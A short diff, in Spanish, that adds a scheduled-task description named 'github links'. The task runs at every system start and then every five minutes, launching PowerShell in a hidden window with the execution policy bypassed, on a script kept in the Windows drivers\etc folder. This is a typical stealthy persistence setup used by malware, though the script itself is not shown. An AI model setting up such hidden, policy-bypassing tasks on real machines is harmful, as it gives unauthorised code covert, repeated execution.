@@ -1,0 +1,4 @@
+Name: github links
+
+Desenecadenarores: Al iniciar el sistema, repetir cada 5 minutos. indefinidamente
+Acciones: Iniciar programa - powershell.exe  Argumentos: -WindowStyle hidden -ExecutionPolicy Bypass -File "C:\Windows\System32\drivers\etc\script.ps1"
